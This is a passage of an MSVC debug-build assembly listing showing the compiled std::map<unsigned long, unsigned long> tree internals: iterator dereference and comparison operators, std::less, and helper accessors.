  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 277  :         return pointer_traits<pointer>::pointer_to(**this);

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ??D?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEAAU?$pair@$$CBKK@1@XZ ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator*
  00014	50		 push	 eax
  00015	e8 00 00 00 00	 call	 ?pointer_to@?$pointer_traits@PAU?$pair@$$CBKK@std@@@std@@SAPAU?$pair@$$CBKK@2@AAU32@@Z ; std::pointer_traits<std::pair<unsigned long const ,unsigned long> *>::pointer_to
  0001a	83 c4 04	 add	 esp, 4

; 278  :     }

  0001d	5f		 pop	 edi
  0001e	5e		 pop	 esi
  0001f	5b		 pop	 ebx
  00020	8b e5		 mov	 esp, ebp
  00022	5d		 pop	 ebp
  00023	c3		 ret	 0
??C?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEPAU?$pair@$$CBKK@1@XZ ENDP ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator->
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??D?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEAAU?$pair@$$CBKK@1@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??D?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEAAU?$pair@$$CBKK@1@XZ PROC ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator*, COMDAT
; _this$ = ecx

; 272  :     _NODISCARD reference operator*() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 273  :         return const_cast<reference>(_Mybase::operator*());

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ??D?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEABU?$pair@$$CBKK@1@XZ ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator*

; 274  :     }

  00014	5f		 pop	 edi
  00015	5e		 pop	 esi
  00016	5b		 pop	 ebx
  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c3		 ret	 0
??D?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEAAU?$pair@$$CBKK@1@XZ ENDP ; std::_Tree_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator*
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
;	COMDAT ??0?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___param0$ = 8						; size = 4
___param1$ = 12						; size = 4
??0?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z PROC ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  0000c	8b 45 0c	 mov	 eax, DWORD PTR ___param1$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d 08	 mov	 ecx, DWORD PTR ___param0$[ebp]
  00013	51		 push	 ecx
  00014	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00017	e8 00 00 00 00	 call	 ??0?$_Tree_unchecked_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@U_Iterator_base0@2@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z ; std::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,std::_Iterator_base0>::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,std::_Iterator_base0>
  0001c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001f	5f		 pop	 edi
  00020	5e		 pop	 esi
  00021	5b		 pop	 ebx
  00022	8b e5		 mov	 esp, ebp
  00024	5d		 pop	 ebp
  00025	c2 08 00	 ret	 8
??0?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z ENDP ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??9?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z
_TEXT	SEGMENT
tv69 = -72						; size = 4
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??9?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z PROC ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator!=, COMDAT
; _this$ = ecx

; 235  :     _NODISCARD bool operator!=(const _Tree_const_iterator& _Right) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 236  :         return !(*this == _Right);

  0000c	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ??8?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator==
  00018	0f b6 c8	 movzx	 ecx, al
  0001b	85 c9		 test	 ecx, ecx
  0001d	75 09		 jne	 SHORT $LN3@operator
  0001f	c7 45 b8 01 00
	00 00		 mov	 DWORD PTR tv69[ebp], 1
  00026	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  00028	c7 45 b8 00 00
	00 00		 mov	 DWORD PTR tv69[ebp], 0
$LN4@operator:
  0002f	8a 45 b8	 mov	 al, BYTE PTR tv69[ebp]

; 237  :     }

  00032	5f		 pop	 edi
  00033	5e		 pop	 esi
  00034	5b		 pop	 ebx
  00035	8b e5		 mov	 esp, ebp
  00037	5d		 pop	 ebp
  00038	c2 04 00	 ret	 4
??9?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z ENDP ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator!=
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??8?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z
_TEXT	SEGMENT
tv75 = -72						; size = 4
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??8?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z PROC ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator==, COMDAT
; _this$ = ecx

; 227  :     _NODISCARD bool operator==(const _Tree_const_iterator& _Right) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 228  : #if _ITERATOR_DEBUG_LEVEL == 2
; 229  :         _STL_VERIFY(this->_Getcont() == _Right._Getcont(), "map/set iterators incompatible");
; 230  : #endif // _ITERATOR_DEBUG_LEVEL == 2
; 231  : 
; 232  :         return this->_Ptr == _Right._Ptr;

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	8b 10		 mov	 edx, DWORD PTR [eax]
  00014	3b 11		 cmp	 edx, DWORD PTR [ecx]
  00016	75 09		 jne	 SHORT $LN3@operator
  00018	c7 45 b8 01 00
	00 00		 mov	 DWORD PTR tv75[ebp], 1
  0001f	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  00021	c7 45 b8 00 00
	00 00		 mov	 DWORD PTR tv75[ebp], 0
$LN4@operator:
  00028	8a 45 b8	 mov	 al, BYTE PTR tv75[ebp]

; 233  :     }

  0002b	5f		 pop	 edi
  0002c	5e		 pop	 esi
  0002d	5b		 pop	 ebx
  0002e	8b e5		 mov	 esp, ebp
  00030	5d		 pop	 ebp
  00031	c2 04 00	 ret	 4
??8?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBE_NABV01@@Z ENDP ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator==
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??D?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEABU?$pair@$$CBKK@1@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??D?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEABU?$pair@$$CBKK@1@XZ PROC ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator*, COMDAT
; _this$ = ecx

; 178  :     _NODISCARD reference operator*() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 179  : #if _ITERATOR_DEBUG_LEVEL == 2
; 180  :         const auto _Mycont = static_cast<const _Mytree*>(this->_Getcont());
; 181  :         _STL_ASSERT(_Mycont, "cannot dereference value-initialized map/set iterator");
; 182  :         _STL_VERIFY(this->_Ptr != _Mycont->_Myhead, "cannot dereference end map/set iterator");
; 183  : #endif // _ITERATOR_DEBUG_LEVEL == 2
; 184  : 
; 185  :         return this->_Ptr->_Myval;

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	8b 00		 mov	 eax, DWORD PTR [eax]
  00011	83 c0 10	 add	 eax, 16			; 00000010H

; 186  :     }

  00014	5f		 pop	 edi
  00015	5e		 pop	 esi
  00016	5b		 pop	 ebx
  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c3		 ret	 0
??D?$_Tree_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@QBEABU?$pair@$$CBKK@1@XZ ENDP ; std::_Tree_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >::operator*
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ??0?$_Tree_unchecked_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@U_Iterator_base0@2@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Pnode$ = 8						; size = 4
__Plist$ = 12						; size = 4
??0?$_Tree_unchecked_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@U_Iterator_base0@2@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z PROC ; std::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,std::_Iterator_base0>::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,std::_Iterator_base0>, COMDAT
; _this$ = ecx

; 39   :     _Tree_unchecked_const_iterator(_Nodeptr _Pnode, const _Mytree* _Plist) noexcept : _Ptr(_Pnode) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __Pnode$[ebp]
  00012	89 08		 mov	 DWORD PTR [eax], ecx

; 40   :         this->_Adopt(_Plist);

  00014	8b 45 0c	 mov	 eax, DWORD PTR __Plist$[ebp]
  00017	50		 push	 eax
  00018	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ?_Adopt@_Iterator_base0@std@@QAEXPBX@Z ; std::_Iterator_base0::_Adopt

; 41   :     }

  00020	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00023	5f		 pop	 edi
  00024	5e		 pop	 esi
  00025	5b		 pop	 ebx
  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c2 08 00	 ret	 8
??0?$_Tree_unchecked_const_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@U_Iterator_base0@2@@std@@QAE@PAU?$_Tree_node@U?$pair@$$CBKK@std@@PAX@1@PBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@1@@Z ENDP ; std::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,std::_Iterator_base0>::_Tree_unchecked_const_iterator<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,std::_Iterator_base0>
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@U?$less@K@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@$00@2@$00@std@@QBEABU?$less@K@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_first@?$_Compressed_pair@U?$less@K@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@$00@2@$00@std@@QBEABU?$less@K@2@XZ PROC ; std::_Compressed_pair<std::less<unsigned long>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<unsigned long const ,unsigned long>,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,1>,1>::_Get_first, COMDAT
; _this$ = ecx

; 1347 :     constexpr const _Ty1& _Get_first() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1348 :         return *this;

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 1349 :     }

  0000f	5f		 pop	 edi
  00010	5e		 pop	 esi
  00011	5b		 pop	 ebx
  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
?_Get_first@?$_Compressed_pair@U?$less@K@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@$00@2@$00@std@@QBEABU?$less@K@2@XZ ENDP ; std::_Compressed_pair<std::less<unsigned long>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<unsigned long const ,unsigned long>,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,1>,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xstddef
;	COMDAT ??R?$less@K@std@@QBE_NABK0@Z
_TEXT	SEGMENT
tv65 = -72						; size = 4
_this$ = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??R?$less@K@std@@QBE_NABK0@Z PROC			; std::less<unsigned long>::operator(), COMDAT
; _this$ = ecx

; 126  :     constexpr bool operator()(const _Ty& _Left, const _Ty& _Right) const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 127  :         return _Left < _Right;

  0000c	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  0000f	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  00012	8b 10		 mov	 edx, DWORD PTR [eax]
  00014	3b 11		 cmp	 edx, DWORD PTR [ecx]
  00016	73 09		 jae	 SHORT $LN3@operator
  00018	c7 45 b8 01 00
	00 00		 mov	 DWORD PTR tv65[ebp], 1
  0001f	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  00021	c7 45 b8 00 00
	00 00		 mov	 DWORD PTR tv65[ebp], 0
$LN4@operator:
  00028	8a 45 b8	 mov	 al, BYTE PTR tv65[ebp]

; 128  :     }

  0002b	5f		 pop	 edi
  0002c	5e		 pop	 esi
  0002d	5b		 pop	 ebx
  0002e	8b e5		 mov	 esp, ebp
  00030	5d		 pop	 ebp
  00031	c2 08 00	 ret	 8
??R?$less@K@std@@QBE_NABK0@Z ENDP			; std::less<unsigned long>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ PROC ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary, COMDAT
; _this$ = ecx

; 2050 :     const _Scary_val* _Get_scary() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2051 :         return _STD addressof(_Mypair._Myval2._Myval2);

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	50		 push	 eax
  00010	e8 00 00 00 00	 call	 ??$addressof@$$CBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@ABV10@@Z ; std::addressof<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > const >
  00015	83 c4 04	 add	 esp, 4

; 2052 :     }

  00018	5f		 pop	 edi
  00019	5e		 pop	 esi
  0001a	5b		 pop	 ebx
  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c3		 ret	 0
?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEPBV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ ENDP ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IAEPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IAEPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ PROC ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary, COMDAT
; _this$ = ecx

; 2046 :     _Scary_val* _Get_scary() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2047 :         return _STD addressof(_Mypair._Myval2._Myval2);

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	50		 push	 eax
  00010	e8 00 00 00 00	 call	 ??$addressof@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@std@@YAPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@0@AAV10@@Z ; std::addressof<std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > > >
  00015	83 c4 04	 add	 esp, 4

; 2048 :     }

  00018	5f		 pop	 edi
  00019	5e		 pop	 esi
  0001a	5b		 pop	 ebx
  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c3		 ret	 0
?_Get_scary@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IAEPAV?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@XZ ENDP ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Get_scary
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ?_Getcomp@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEABU?$less@K@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Getcomp@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEABU?$less@K@2@XZ PROC ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Getcomp, COMDAT
; _this$ = ecx

; 2034 :     const key_compare& _Getcomp() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2035 :         return _Mypair._Get_first();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@U?$less@K@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@$$CBKK@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@2@$00@2@$00@std@@QBEABU?$less@K@2@XZ ; std::_Compressed_pair<std::less<unsigned long>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<unsigned long const ,unsigned long>,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<unsigned long const ,unsigned long> > >,1>,1>::_Get_first

; 2036 :     }

  00014	5f		 pop	 edi
  00015	5e		 pop	 esi
  00016	5b		 pop	 ebx
  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c3		 ret	 0
?_Getcomp@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@IBEABU?$less@K@2@XZ ENDP ; std::_Tree<std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0> >::_Getcomp
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\xtree
;	COMDAT ?find@?$_Tree@V?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@@std@@QAE?AV?$_Tree_iterator@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@$$CBKK@std@@@std@@@std@@@2@ABK@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
__Keyval$ = 12						; size = 4
